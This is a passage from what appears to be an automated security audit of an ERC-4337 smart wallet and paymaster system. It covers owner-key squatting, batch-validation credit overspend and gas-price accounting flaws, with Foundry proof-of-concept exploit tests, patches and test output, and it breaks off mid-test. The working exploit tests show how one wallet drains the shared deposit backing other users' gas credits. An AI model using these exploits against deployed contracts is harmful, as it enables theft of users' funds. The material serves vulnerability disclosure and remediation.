 
     // --------------------------------------------
     //  Owner synchronization (wallets)
     // --------------------------------------------
 
     /// @inheritdoc IHPWalletRegistry
     function addOwner(bytes calldata owner) external onlyRegisteredWallet {
+        if (!IHPWalletOwnerClaimAuthorizer(msg.sender).canAuthorizeOwnerClaim(owner)) {
+            revert UnauthorizedOwnerClaim();
+        }
+
         _indexOwner(msg.sender, owner);
     }
 
     /// @inheritdoc IHPWalletRegistry
     function removeOwner(bytes calldata owner) external onlyRegisteredWallet {
         bytes32 ownerHash = keccak256(owner);
         if (getWallet[ownerHash] != msg.sender) revert OwnerNotRegisteredToWallet(owner, msg.sender);
 
         delete getWallet[ownerHash];
 
         emit OwnerDeindexed(msg.sender, ownerHash, owner);
     }
 
     /// @dev One wallet per signer key: an owner already mapped elsewhere reverts to keep lookups unambiguous.
     function _indexOwner(address wallet, bytes memory owner) private {
         bytes32 ownerHash = keccak256(owner);
 
         address current = getWallet[ownerHash];
         if (current != address(0)) revert OwnerAlreadyRegistered(owner, current);
 
         getWallet[ownerHash] = wallet;
 
         emit OwnerIndexed(wallet, ownerHash, owner);
     }
 
     // --------------------------------------------
     //  Lookups
     // --------------------------------------------
 
     /// @inheritdoc IHPWalletRegistry
     function walletOf(address owner) external view returns (address) {
         return getWallet[keccak256(abi.encode(owner))];
     }
 
     /// @notice Wallet for a passkey owner (P-256 public key coordinates).
     function walletOfPublicKey(bytes32 x, bytes32 y) external view returns (address) {
         return getWallet[keccak256(abi.encode(x, y))];
     }
 
     function walletCount() external view returns (uint256) {
         return _wallets.length;
     }
 
     function walletAt(uint256 index) external view returns (address) {
         return _wallets[index];
     }
 
     /// @notice Paginated read — prefer this for large sets if RPC limits are hit.
     function getWallets(uint256 offset, uint256 limit) external view returns (address[] memory) {
         return _getWalletsSlice(offset, limit);
     }
 
     /// @notice Full snapshot (fine for off-chain `eth_call` at moderate sizes; use pagination if not).
     function getAllWallets() external view returns (address[] memory) {
         return _getWalletsSlice(0, _wallets.length);
     }
 
     function _getWalletsSlice(uint256 offset, uint256 limit) private view returns (address[] memory wallets) {
         uint256 n = _wallets.length;
         if (offset >= n || limit == 0) {
             return new address[](0);
         }
         uint256 end = offset + limit;
         if (end > n) end = n;
         uint256 len = end - offset;
         wallets = new address[](len);
         for (uint256 i; i < len; ++i) {
             wallets[i] = _wallets[offset + i];
         }
     }
 }
```

### Affected files
- `contracts/src/wallets/HPSmartWallet.sol`
- `contracts/src/wallets/HPWalletRegistry.sol`

### Validation output

```
[output truncated: 37 lines & 1.998046875 KB skipped]
Encountered 3 failing tests in test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[FAIL: assertion failed: 0x0000000000000000000000000000000000000000 != 0xD2aBfc3F2315dbe70b66135c3e15aaD58e051e24] test_poc_createAccountCanPoisonVictimRegistryEntryAndStealIncomingEth() (gas: 404250)
[FAIL: assertion failed: 0x0000000000000000000000000000000000000000 != 0xcc465B190d26E9132082CA61228806D3AcCdd623] test_poc_registeredOwnerCanLaterClaimVictimKeyAndStealIncomingEth() (gas: 404062)
[FAIL: assertion failed: 0x0000000000000000000000000000000000000000 != 0xD2aBfc3F2315dbe70b66135c3e15aaD58e051e24] test_poc_squattingVictimKeyMakesPrefundedCounterfactualAddressUndeployable() (gas: 440886)

Encountered a total of 3 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 3 failed tests

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# Unreserved credit overspend
**#84970**
- Severity: High
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPPaymaster.sol` (4 locations)
#### Lines 35-38 — _Per-wallet and aggregate credit accounting._

```
    mapping(address wallet => uint256 creditWei) public gasCredit;

    /// @dev Sum of all outstanding credits; EntryPoint deposit above this is withdrawable surplus.
    uint256 public totalGasCredit;
```

⋯
#### Lines 115-131 — _Validation reads credit but performs no reservation or debit._

```
    function validatePaymasterUserOp(UserOperation06 calldata userOp, bytes32, uint256 maxCost)
        external
        view
        onlyEntryPoint
        returns (bytes memory context, uint256 validationData)
    {
        address sender = userOp.sender;

        // Wallet deployment (initCode) runs before paymaster validation, so freshly created wallets are
        // already registered by the factory at this point.
        if (!registry.isRegisteredWallet(sender)) revert WalletNotRegistered(sender);

        uint256 required = maxCost + POST_OP_GAS * userOp.maxFeePerGas;
        uint256 credit = gasCredit[sender];
        if (credit < required) revert InsufficientGasCredit(sender, credit, required);

        return (abi.encode(sender), 0);
```

⋯
#### Lines 138-148 — _Settlement clamps charges to remaining wallet credit._

```
    function postOp(PostOpMode, bytes calldata context, uint256 actualGasCost) external onlyEntryPoint {
        address wallet = abi.decode(context, (address));

        uint256 charge = actualGasCost + POST_OP_GAS * tx.gasprice;
        uint256 credit = gasCredit[wallet];
        if (charge > credit) charge = credit;

        unchecked {
            gasCredit[wallet] = credit - charge;
            totalGasCredit -= charge;
        }
```

⋯
#### Lines 183-187 — _Surplus calculation assumes EntryPoint deposit backs totalGasCredit._

```
    /// @notice EntryPoint deposit not backing any user credit.
    function surplus() public view returns (uint256) {
        uint256 deposit = entryPoint.balanceOf(address(this));
        return deposit > totalGasCredit ? deposit - totalGasCredit : 0;
    }
```

### `contracts/lib/account-abstraction/contracts/legacy/v06/IEntryPoint06.sol`
#### Lines 120-128 — _Legacy EntryPoint batch entrypoint accepts an array of user operations._

```
    /**
     * Execute a batch of UserOperation.
     * no signature aggregator is used.
     * if any account requires an aggregator (that is, it returned an aggregator when
     * performing simulateValidation), then handleAggregatedOps() must be used instead.
     * @param ops the operations to execute
     * @param beneficiary the address to receive the fees
     */
    function handleOps(UserOperation06[] calldata ops, address payable beneficiary) external;
```

### `contracts/lib/account-abstraction/contracts/core/EntryPoint.sol` (2 locations)
#### Lines 78-91 — _Vendored EntryPoint model validates the batch before executing operations._

```
    function handleOps(
        PackedUserOperation[] calldata ops,
        address payable beneficiary
    ) external virtual nonReentrant {
        uint256 opslen = ops.length;
        UserOpInfo[] memory opInfos = new UserOpInfo[](opslen);
        unchecked {
            _iterateValidationPhase(ops, opInfos, address(0), 0);

            uint256 collected = 0;
            emit BeforeExecution();

            for (uint256 i = 0; i < opslen; i++) {
                collected += _executeUserOp(i, ops[i], opInfos[i]);
```

⋯
#### Lines 346-367 — _Validation phase iterates all operations before execution._

```
    function _iterateValidationPhase(
        PackedUserOperation[] calldata ops,
        UserOpInfo[] memory opInfos,
        address expectedAggregator,
        uint256 opIndexOffset
    ) internal virtual returns (uint256 opsLen){
        unchecked {
            opsLen = ops.length;
            for (uint256 i = 0; i < opsLen; i++) {
                UserOpInfo memory opInfo = opInfos[opIndexOffset + i];
                (
                    uint256 validationData,
                    uint256 pmValidationData
                ) = _validatePrepayment(opIndexOffset + i, ops[i], opInfo);
                _validateAccountAndPaymasterValidationData(
                    opIndexOffset + i,
                    validationData,
                    pmValidationData,
                    expectedAggregator
                );
            }
        }
```

## Description

`HPPaymaster` treats a wallet’s `gasCredit` as reusable across paymaster validation calls. `validatePaymasterUserOp` is a `view` function that checks only the current credit against one operation’s `maxCost + POST_OP_GAS * userOp.maxFeePerGas` and returns only the wallet address as context, so it never reserves or decrements the amount that was just approved. ERC-4337 batches can contain multiple user operations, and the vendored EntryPoint implementation validates the batch before executing any operation. A registered wallet can sign several sequential operations that each individually fit its credit, have every validation pass against the same starting credit, and only be charged later in `postOp`. When the combined charges exceed that wallet’s credit, `postOp` clamps the charge to the remaining per-wallet credit while the shared EntryPoint deposit has paid the actual gas, leaving other wallets’ credited deposit unbacked.

## Root cause

Paymaster validation approves per-wallet credit without reserving it even though a batch can validate multiple operations before any `postOp` settlement. The later `postOp` clamp hides over-consumption instead of preserving the invariant that `entryPoint.balanceOf(address(this)) >= totalGasCredit`.

## Impact

A funded attacker wallet can spend more sponsored gas than it funded, drawing down the shared EntryPoint deposit that backs other users’ credits. The paymaster can end up with `totalGasCredit` greater than its EntryPoint balance, so unrelated users’ sponsored operations can fail or their gas-credit backing can be converted into attacker-beneficiary gas payments.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { IPaymaster06 } from "@account-abstraction/legacy/v06/IPaymaster06.sol";
import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";

import { HPPaymaster } from "@src/wallets/HPPaymaster.sol";
import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract BatchMockEntryPoint {
    mapping(address account => uint256 amount) public balanceOf;

    error PaymasterDepositTooLow(uint256 available, uint256 required);

    function depositTo(address account) external payable {
        balanceOf[account] += msg.value;
    }

    function addStake(uint32) external payable { }

    function unlockStake() external { }

    function withdrawStake(address payable) external { }

    function withdrawTo(address payable to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        (bool ok,) = to.call{ value: amount }("");
        require(ok, "withdraw transfer failed");
    }

    function validateOnly(HPPaymaster paymaster, UserOperation06 calldata op, uint256 maxCost)
        external
        returns (bytes memory context, uint256 validationData)
    {
        return paymaster.validatePaymasterUserOp(op, bytes32(0), maxCost);
    }

    function validateWithDepositCheck(HPPaymaster paymaster, UserOperation06 calldata op, uint256 maxCost)
        external
        returns (bytes memory context, uint256 validationData)
    {
        uint256 required = maxCost + paymaster.POST_OP_GAS() * op.maxFeePerGas;
        uint256 available = balanceOf[address(paymaster)];
        if (available < required) revert PaymasterDepositTooLow(available, required);

        balanceOf[address(paymaster)] = available - required;
        (context, validationData) = paymaster.validatePaymasterUserOp(op, bytes32(0), maxCost);
        balanceOf[address(paymaster)] += required;
    }

    function handleBatch(
        HPPaymaster paymaster,
        UserOperation06[] calldata ops,
        uint256[] calldata maxCosts,
        uint256[] calldata actualGasCosts
    ) external returns (bytes[] memory contexts) {
        uint256 len = ops.length;
        require(len == maxCosts.length && len == actualGasCosts.length, "length mismatch");

        contexts = new bytes[](len);
        uint256[] memory prefunds = new uint256[](len);

        for (uint256 i; i < len; i++) {
            uint256 required = maxCosts[i] + paymaster.POST_OP_GAS() * ops[i].maxFeePerGas;
            uint256 available = balanceOf[address(paymaster)];
            if (available < required) revert PaymasterDepositTooLow(available, required);

            balanceOf[address(paymaster)] = available - required;
            prefunds[i] = required;
            (contexts[i],) = paymaster.validatePaymasterUserOp(ops[i], bytes32(0), maxCosts[i]);
        }

        for (uint256 i; i < len; i++) {
            paymaster.postOp(IPaymaster06.PostOpMode.opSucceeded, contexts[i], actualGasCosts[i]);

            uint256 actualCharge = actualGasCosts[i] + paymaster.POST_OP_GAS() * tx.gasprice;
            if (prefunds[i] > actualCharge) {
                balanceOf[address(paymaster)] += prefunds[i] - actualCharge;
            }
        }
    }

    receive() external payable { }
}

contract HPPaymasterUnreservedCreditOverspendPoC is WalletTestBase {
    BatchMockEntryPoint internal mockEntryPoint;
    HPPaymaster internal paymaster;
    HPSmartWallet internal attackerWallet;
    HPSmartWallet internal victimWallet;

    address internal funder = makeAddr("funder");

    function setUp() public override {
        super.setUp();

        mockEntryPoint = new BatchMockEntryPoint();
        paymaster = new HPPaymaster(address(provider), address(mockEntryPoint));

        vm.prank(admin);
        provider.registerName("PAYMASTER", address(paymaster));

        attackerWallet = _createWallet(ownerEOA, 0);
        victimWallet = _createWallet(makeAddr("victimOwner"), 1);

        vm.deal(funder, 1 ether);
        vm.startPrank(funder);
        paymaster.depositFor{ value: 0.09 ether }(address(attackerWallet));
        paymaster.depositFor{ value: 0.06 ether }(address(victimWallet));
        vm.stopPrank();
    }

    function _op(address sender, uint256 nonce, uint256 maxFeePerGas) internal pure returns (UserOperation06 memory op) {
        op = _baseUserOp(sender, nonce);
        op.maxFeePerGas = maxFeePerGas;
        op.maxPriorityFeePerGas = maxFeePerGas;
    }

    function test_batchValidationLetsOneWalletSpendPastItsOwnCredit() public {
        uint256 gasPrice = 1 gwei;
        vm.txGasPrice(gasPrice);

        uint256 attackerMaxCost = 0.05 ether;
        uint256 victimMaxCost = 0.055 ether;
        uint256 margin = paymaster.POST_OP_GAS() * gasPrice;
        uint256 attackerRequired = attackerMaxCost + margin;
        uint256 victimRequired = victimMaxCost + margin;

        assertLe(attackerRequired, paymaster.gasCredit(address(attackerWallet)));
        assertGt(attackerRequired * 2, paymaster.gasCredit(address(attackerWallet)));

        UserOperation06[] memory attackerOps = new UserOperation06[](2);
        attackerOps[0] = _op(address(attackerWallet), 0, gasPrice);
        attackerOps[1] = _op(address(attackerWallet), 1, gasPrice);

        uint256[] memory maxCosts = new uint256[](2);
        maxCosts[0] = attackerMaxCost;
        maxCosts[1] = attackerMaxCost;

        uint256[] memory actualGasCosts = new uint256[](2);
        actualGasCosts[0] = attackerMaxCost;
        actualGasCosts[1] = attackerMaxCost;

        mockEntryPoint.handleBatch(paymaster, attackerOps, maxCosts, actualGasCosts);

        uint256 remainingDeposit = mockEntryPoint.balanceOf(address(paymaster));
        uint256 attackerCredit = paymaster.gasCredit(address(attackerWallet));
        uint256 victimCredit = paymaster.gasCredit(address(victimWallet));

        assertEq(attackerCredit, 0);
        assertEq(victimCredit, 0.06 ether);
        assertEq(paymaster.totalGasCredit(), victimCredit);
        assertEq(remainingDeposit, 0.15 ether - attackerRequired * 2);
        assertLt(remainingDeposit, paymaster.totalGasCredit());
        assertEq(paymaster.surplus(), 0);

        UserOperation06 memory victimOp = _op(address(victimWallet), 0, gasPrice);

        (, uint256 validationData) = mockEntryPoint.validateOnly(paymaster, victimOp, victimMaxCost);
        assertEq(validationData, 0);
        assertGe(victimCredit, victimRequired);

        vm.expectRevert(
            abi.encodeWithSelector(BatchMockEntryPoint.PaymasterDepositTooLow.selector, remainingDeposit, victimRequired)
        );
        mockEntryPoint.validateWithDepositCheck(paymaster, victimOp, victimMaxCost);
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd contracts && forge build
```

### Output

```
[output truncated: 30 lines & 1.2451171875 KB skipped]
33 |     function validateOnly(HPPaymaster paymaster, UserOperation06 calldata op, uint256 maxCost)
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/wallets/WalletHarnessPlaceholder.t.sol:HPPaymasterUnreservedCreditOverspendPoC
[PASS] test_batchValidationLetsOneWalletSpendPastItsOwnCredit() (gas: 95028)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.79ms (321.74µs CPU time)

Ran 1 test suite in 11.15ms (2.79ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC compiled and passed via `cd contracts && forge test --match-path test/wallets/WalletHarnessPlaceholder.t.sol -vv`. It demonstrates the bug at the paymaster’s public ERC-4337 entrypoints with a test-local EntryPoint stand-in that mirrors the relevant batch behavior: validate all ops first, then settle/postOp and decrement paymaster deposit. It does not execute the full vendored EntryPoint bytecode or real wallet signatures; the wallet hardcodes the canonical EntryPoint address, so the exploit is shown by tracing the paymaster accounting invariant break and the resulting victim validation failure under realistic batch semantics.

## Remediation

### Explanation

Track per-wallet reserved gas credit across validatePaymasterUserOp calls. Validation now reserves maxCost plus postOp margin and returns the reserved amount in context; postOp releases the reservation and charges only the actual amount, preventing the same wallet credit from being approved multiple times within one EntryPoint batch.

### Patch

```diff
diff --git a/contracts/src/wallets/HPPaymaster.sol b/contracts/src/wallets/HPPaymaster.sol
--- a/contracts/src/wallets/HPPaymaster.sol
+++ b/contracts/src/wallets/HPPaymaster.sol
@@ -1,188 +1,193 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { IEntryPoint } from "@account-abstraction/legacy/v06/IEntryPoint06.sol";
 import { IPaymaster06 } from "@account-abstraction/legacy/v06/IPaymaster06.sol";
 import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { IHPWalletRegistry } from "./interfaces/IHPWalletRegistry.sol";
 
 /// @title HPPaymaster
 /// @notice ERC-4337 v0.6 deposit paymaster: sponsors gas for registered HPSmartWallets out of per-wallet ETH
 ///         credits. Credits are funded via `depositFor` (deposit-skim flow, future deposit router, or treasury
 ///         top-up) and the backing ETH lives as this contract's deposit inside the EntryPoint.
 /// @dev Validation-phase rules (ERC-7562):
 ///      - `registry.isRegisteredWallet[sender]` and `gasCredit[sender]` are sender-associated storage — allowed.
 ///      - The AddressProvider must NOT be read during validation, so the registry address is cached in this
 ///        contract's own storage (allowed while staked) and refreshed permissionlessly via `syncRegistry`.
 ///      Deployment order: registry -> paymaster (constructor resolves WALLET_REGISTRY), then `addStake` and an
 ///      initial `depositFor`/EntryPoint deposit before the first sponsored op.
 contract HPPaymaster is IPaymaster06, AddressBook {
     // --------------------------------------------
     //  Configuration
     // --------------------------------------------
 
     /// @dev Gas margin charged on top of `actualGasCost` to cover the `postOp` call itself.
     uint256 public constant POST_OP_GAS = 45_000;
 
     IEntryPoint public immutable entryPoint;
 
     /// @dev Cached so validation never touches AddressProvider storage (see contract natspec).
     IHPWalletRegistry public registry;
 
     mapping(address wallet => uint256 creditWei) public gasCredit;
+    mapping(address wallet => uint256 creditWei) internal reservedCredit;
 
     /// @dev Sum of all outstanding credits; EntryPoint deposit above this is withdrawable surplus.
     uint256 public totalGasCredit;
 
     // --------------------------------------------
     //  Events and Errors
     // --------------------------------------------
 
     event GasCreditDeposited(address indexed funder, address indexed wallet, uint256 amount);
     event GasCreditUsed(address indexed wallet, uint256 amount);
     event RegistrySynced(address indexed registry);
     event SurplusWithdrawn(address indexed to, uint256 amount);
 
     error NotEntryPoint();
     error NotAdmin();
     error ZeroEntryPoint();
     error ZeroWallet();
     error ZeroDeposit();
     error ZeroWithdrawAddress();
     error WalletNotRegistered(address wallet);
     error InsufficientGasCredit(address wallet, uint256 credit, uint256 required);
     error WithdrawExceedsSurplus(uint256 requested, uint256 surplus);
 
     // --------------------------------------------
     //  Modifiers
     // --------------------------------------------
 
     modifier onlyEntryPoint() {
         if (msg.sender != address(entryPoint)) revert NotEntryPoint();
         _;
     }
 
     /// @dev Admin = holder of the AddressProvider's DEFAULT_ADMIN_ROLE; no separate ownership system.
     modifier onlyAdmin() {
         if (!addressProvider.hasRole(bytes32(0), msg.sender)) revert NotAdmin();
         _;
     }
 
     // --------------------------------------------
     //  Initialization
     // --------------------------------------------
 
     constructor(address addressProvider_, address entryPoint_) AddressBook(addressProvider_) {
         if (entryPoint_ == address(0)) revert ZeroEntryPoint();
         entryPoint = IEntryPoint(entryPoint_);
         syncRegistry();
     }
 
     /// @notice Re-resolves the registry from the AddressProvider. Permissionless: the provider is the source
     ///         of truth and its mutations are already role-gated.
     function syncRegistry() public {
         registry = IHPWalletRegistry(_getAddress(_addressKey("WALLET_REGISTRY")));
         emit RegistrySynced(address(registry));
     }
 
     // --------------------------------------------
     //  Funding
     // --------------------------------------------
 
     /// @notice Credits `wallet` with `msg.value` of gas allowance and moves the ETH into the EntryPoint deposit.
     /// @dev Callable by anyone (treasury script, deposit router, or the user). `wallet` may be a counterfactual
     ///      address — credits can be funded before the wallet is deployed.
     function depositFor(address wallet) external payable {
         if (wallet == address(0)) revert ZeroWallet();
         if (msg.value == 0) revert ZeroDeposit();
 
         gasCredit[wallet] += msg.value;
         totalGasCredit += msg.value;
 
         entryPoint.depositTo{ value: msg.value }(address(this));
 
         emit GasCreditDeposited(msg.sender, wallet, msg.value);
     }
 
     // --------------------------------------------
     //  ERC-4337 paymaster
     // --------------------------------------------
 
     /// @inheritdoc IPaymaster06
     function validatePaymasterUserOp(UserOperation06 calldata userOp, bytes32, uint256 maxCost)
         external
-        view
         onlyEntryPoint
         returns (bytes memory context, uint256 validationData)
     {
         address sender = userOp.sender;
 
         // Wallet deployment (initCode) runs before paymaster validation, so freshly created wallets are
         // already registered by the factory at this point.
         if (!registry.isRegisteredWallet(sender)) revert WalletNotRegistered(sender);
 
         uint256 required = maxCost + POST_OP_GAS * userOp.maxFeePerGas;
+        uint256 reserved = reservedCredit[sender];
         uint256 credit = gasCredit[sender];
-        if (credit < required) revert InsufficientGasCredit(sender, credit, required);
+        if (credit < reserved + required) revert InsufficientGasCredit(sender, credit - reserved, required);
 
-        return (abi.encode(sender), 0);
+        reservedCredit[sender] = reserved + required;
+
+        return (abi.encode(sender, required), 0);
     }
 
     /// @inheritdoc IPaymaster06
     /// @dev Never reverts: a postOp revert would force the EntryPoint to re-execute in `postOpReverted` mode.
-    ///      The charge is clamped to the remaining credit; validation guarantees the clamp is a no-op in
-    ///      practice (credit covered maxCost + margin).
+    ///      Validation reserves `maxCost + postOp margin` per operation so later validations cannot reuse the same
+    ///      credit before this operation settles.
     function postOp(PostOpMode, bytes calldata context, uint256 actualGasCost) external onlyEntryPoint {
-        address wallet = abi.decode(context, (address));
+        (address wallet, uint256 reserved) = abi.decode(context, (address, uint256));
 
         uint256 charge = actualGasCost + POST_OP_GAS * tx.gasprice;
         uint256 credit = gasCredit[wallet];
+        if (charge > reserved) charge = reserved;
         if (charge > credit) charge = credit;
 
         unchecked {
+            reservedCredit[wallet] -= reserved;
             gasCredit[wallet] = credit - charge;
             totalGasCredit -= charge;
         }
 
         emit GasCreditUsed(wallet, charge);
     }
 
     // --------------------------------------------
     //  EntryPoint stake / deposit administration
     // --------------------------------------------
 
     function addStake(uint32 unstakeDelaySec) external payable onlyAdmin {
         entryPoint.addStake{ value: msg.value }(unstakeDelaySec);
     }
 
     function unlockStake() external onlyAdmin {
         entryPoint.unlockStake();
     }
 
     function withdrawStake(address payable to) external onlyAdmin {
         if (to == address(0)) revert ZeroWithdrawAddress();
         entryPoint.withdrawStake(to);
     }
 
     /// @notice Withdraws EntryPoint deposit above the sum of outstanding user credits (e.g. accumulated
     ///         postOp margins). User credits themselves can never be withdrawn by the platform.
     function withdrawSurplus(address payable to, uint256 amount) external onlyAdmin {
         if (to == address(0)) revert ZeroWithdrawAddress();
 
         uint256 available = surplus();
         if (amount > available) revert WithdrawExceedsSurplus(amount, available);
 
         entryPoint.withdrawTo(to, amount);
 
         emit SurplusWithdrawn(to, amount);
     }
 
     /// @notice EntryPoint deposit not backing any user credit.
     function surplus() public view returns (uint256) {
         uint256 deposit = entryPoint.balanceOf(address(this));
         return deposit > totalGasCredit ? deposit - totalGasCredit : 0;
     }
 }
```

### Affected files
- `contracts/src/wallets/HPPaymaster.sol`

### Validation output

```
[output truncated: 33 lines & 1.6044921875 KB skipped]

Failing tests:
Encountered 1 failing test in test/wallets/WalletHarnessPlaceholder.t.sol:HPPaymasterUnreservedCreditOverspendPoC
[FAIL: InsufficientGasCredit(0xFf4fC90F156Db556902EbC80eda590284115403c, 39955000000000000 [3.995e16], 50045000000000000 [5.004e16])] test_batchValidationLetsOneWalletSpendPastItsOwnCredit() (gas: 75391)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# Wrong gas price accounting
**#84971**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPPaymaster.sol` (2 locations)
#### Lines 127-131 — _Validation prices the margin from the user operation max fee but stores only the sender in context._

```
        uint256 required = maxCost + POST_OP_GAS * userOp.maxFeePerGas;
        uint256 credit = gasCredit[sender];
        if (credit < required) revert InsufficientGasCredit(sender, credit, required);

        return (abi.encode(sender), 0);
```

⋯
#### Lines 138-147 — _Settlement charges the margin using tx.gasprice._

```
    function postOp(PostOpMode, bytes calldata context, uint256 actualGasCost) external onlyEntryPoint {
        address wallet = abi.decode(context, (address));

        uint256 charge = actualGasCost + POST_OP_GAS * tx.gasprice;
        uint256 credit = gasCredit[wallet];
        if (charge > credit) charge = credit;

        unchecked {
            gasCredit[wallet] = credit - charge;
            totalGasCredit -= charge;
```

### `contracts/lib/account-abstraction/contracts/legacy/v06/IPaymaster06.sol`
#### Lines 40-50 — _The postOp actualGasCost parameter excludes the postOp call itself._

```
     * post-operation handler.
     * Must verify sender is the entryPoint
     * @param mode enum with the following options:
     *      opSucceeded - user operation succeeded.
     *      opReverted  - user op reverted. still has to pay for gas.
     *      postOpReverted - user op succeeded, but caused postOp (in mode=opSucceeded) to revert.
     *                       Now this is the 2nd call, after user's op was deliberately reverted.
     * @param context - the context value returned by validatePaymasterUserOp
     * @param actualGasCost - actual gas used so far (without this postOp call).
     */
    function postOp(PostOpMode mode, bytes calldata context, uint256 actualGasCost) external;
```

### `contracts/lib/account-abstraction/contracts/core/UserOperationLib.sol`
#### Lines 25-36 — _User-operation gas price is derived from operation fee caps and basefee._

```
    /**
     * Relayer/block builder might submit the TX with higher priorityFee,
     * but the user should not pay above what he signed for.
     * @param userOp - The user operation data.
     */
    function gasPrice(
        PackedUserOperation calldata userOp
    ) internal view returns (uint256) {
        unchecked {
            (uint256 maxPriorityFeePerGas, uint256 maxFeePerGas) = unpackUints(userOp.gasFees);
            return min(maxFeePerGas, maxPriorityFeePerGas + block.basefee);
        }
```

### `contracts/lib/account-abstraction/contracts/core/BasePaymaster.sol`
#### Lines 90-93 — _Dependency documents that the user-op fee rate is not the same as tx.gasprice._

```
     * @param actualGasCost - Actual cost of gas used so far (without this postOp call).
     * @param actualUserOpFeePerGas - the gas price this UserOp pays. This value is based on the UserOp's maxFeePerGas
     *                        and maxPriorityFee (and basefee)
     *                        It is not the same as tx.gasprice, which is what the bundler pays.
```

## Description

`postOp` accounts for its fixed post-operation margin with `tx.gasprice`. The paymaster interface states that `actualGasCost` excludes the `postOp` call, so this margin is the contract’s internal accounting for gas that the EntryPoint charges after the paymaster callback. User-operation payment is based on the fee caps in the user operation rather than the transaction’s effective gas price, and the vendored paymaster base explicitly notes that the user-op fee rate is not the same as `tx.gasprice`. Because `validatePaymasterUserOp` returns only `abi.encode(sender)`, `postOp` has no stored user-operation fee rate and cannot reconcile the margin to the rate used by the EntryPoint. A bundler-controlled attacker can set a high user-operation priority fee while submitting the bundle with a lower transaction priority fee, causing the EntryPoint deposit to pay postOp gas at the higher user-operation rate while `gasCredit` is reduced only at the lower `tx.gasprice` rate.

## Root cause

`postOp` uses the bundle transaction gas price for credit accounting instead of the user-operation fee rate used by EntryPoint. The validation context omits the fee rate needed to settle the postOp margin consistently.

## Impact

The rate difference creates a deficit between the EntryPoint deposit and `totalGasCredit` and can be captured by the bundle beneficiary on every sponsored operation. Repeating cheap sponsored operations lets an attacker drain shared backing from other wallets’ gas credits without reducing the attacker’s accounting by the same amount.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { IPaymaster06 } from "@account-abstraction/legacy/v06/IPaymaster06.sol";
import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";

import { HPPaymaster } from "@src/wallets/HPPaymaster.sol";
import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

/// @dev Minimal legacy-v0.6 EntryPoint stand-in that settles paymaster deposits at the
///      user-operation fee rate, while forwarding only `actualGasCost` into `postOp`.
contract MockV06EntryPointSettlement {
    mapping(address account => uint256 amount) public balanceOf;

    function depositTo(address account) external payable {
        balanceOf[account] += msg.value;
    }

    function settleSponsoredOp(
        HPPaymaster paymaster,
        UserOperation06 calldata userOp,
        uint256 maxCost,
        uint256 actualGasCost
    ) external returns (bytes memory context, uint256 actualUserOpFeePerGas, uint256 totalDepositCharge) {
        (context,) = paymaster.validatePaymasterUserOp(userOp, bytes32(0), maxCost);

        actualUserOpFeePerGas = _userOpGasPrice(userOp.maxFeePerGas, userOp.maxPriorityFeePerGas);
        totalDepositCharge = actualGasCost + paymaster.POST_OP_GAS() * actualUserOpFeePerGas;

        balanceOf[address(paymaster)] -= totalDepositCharge;
        paymaster.postOp(IPaymaster06.PostOpMode.opSucceeded, context, actualGasCost);
    }

    function _userOpGasPrice(uint256 maxFeePerGas, uint256 maxPriorityFeePerGas) internal view returns (uint256) {
        uint256 cappedPriorityPrice = block.basefee + maxPriorityFeePerGas;
        return maxFeePerGas < cappedPriorityPrice ? maxFeePerGas : cappedPriorityPrice;
    }
}

contract HPPaymasterGasPriceAccountingPoCTest is WalletTestBase {
    MockV06EntryPointSettlement internal mockEntryPoint;
    HPPaymaster internal paymaster;
    HPSmartWallet internal attackerWallet;
    HPSmartWallet internal victimWallet;

    address internal attacker = makeAddr("attacker");
    address internal funder = makeAddr("funder");

    function setUp() public override {
        super.setUp();

        mockEntryPoint = new MockV06EntryPointSettlement();
        paymaster = new HPPaymaster(address(provider), address(mockEntryPoint));

        attackerWallet = _createWallet(attacker, 0);
        victimWallet = _createWallet(makeAddr("victim"), 1);

        vm.deal(funder, 10 ether);
    }

    function test_poc_wrongGasPriceAccounting_createsSharedBackingDeficit() public {
        vm.fee(1 gwei);
        vm.txGasPrice(2 gwei);

        UserOperation06 memory op = _baseUserOp(address(attackerWallet), 0);
        op.maxFeePerGas = 100 gwei;
        op.maxPriorityFeePerGas = 99 gwei;

        uint256 postOpGas = paymaster.POST_OP_GAS();
        uint256 maxCost = 0.01 ether;
        uint256 actualGasCost = 0.003 ether;

        uint256 attackerRequiredCredit = maxCost + postOpGas * op.maxFeePerGas;
        uint256 expectedUserOpFeePerGas = 100 gwei;
        uint256 expectedEntryPointCharge = actualGasCost + postOpGas * expectedUserOpFeePerGas;
        uint256 expectedHPPaymasterCharge = actualGasCost + postOpGas * tx.gasprice;
        uint256 expectedDeficit = expectedEntryPointCharge - expectedHPPaymasterCharge;

        vm.startPrank(funder);
        paymaster.depositFor{ value: attackerRequiredCredit }(address(attackerWallet));
        paymaster.depositFor{ value: 1 ether }(address(victimWallet));
        vm.stopPrank();

        uint256 depositBefore = mockEntryPoint.balanceOf(address(paymaster));
